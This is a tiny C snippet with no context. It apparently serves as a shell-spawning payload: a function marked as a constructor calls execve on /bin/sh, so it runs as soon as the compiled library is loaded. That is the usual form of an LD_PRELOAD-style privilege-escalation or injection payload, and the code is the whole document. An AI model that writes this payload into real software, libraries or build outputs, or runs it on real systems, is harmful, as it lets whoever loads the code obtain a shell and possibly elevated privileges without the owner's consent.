__attribute__((constructor)) main() {
    execve("/bin/sh", 0, 0);
}

